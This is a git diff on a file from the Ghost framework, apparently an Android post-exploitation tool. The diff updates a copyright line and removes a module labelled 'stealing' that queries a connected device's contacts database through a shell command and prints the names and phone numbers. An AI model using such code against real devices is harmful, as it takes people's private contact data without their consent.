@@ -3,7 +3,7 @@
 #
 # MIT License
 #
-# Copyright (c) 2020 EntySec
+# Copyright (c) 2020-2021 EntySec
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
@@ -23,32 +23,3 @@
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 #
-
-from ghost.core.badges import Badges
-
-
-class GhostModule:
-    def __init__(self, ghost):
-        self.ghost = ghost
-        self.badges = Badges()
-
-        self.details = {
-            'name': "view_contacts",
-            'authors': ['jaxparrow07'],
-            'description': "Show Contacts Saved on Device.",
-            'usage': "view_contacts",
-            'type': "stealing",
-            'args': 0,
-            'needs_args': False,
-            'needs_root': False,
-            'comments': ""
-        }
-
-    def run(self):
-        print(self.badges.G + "Getting Contacts information...")
-        output = self.ghost.send_command("shell",
-                                         "content query --uri content://contacts/phones/  --projection display_name:number")
-        output = output.replace('Row: ', '')
-        output = output.replace(' display_name=', ' ')
-        output = output.replace(', number=', ' : ')
-        print(output)
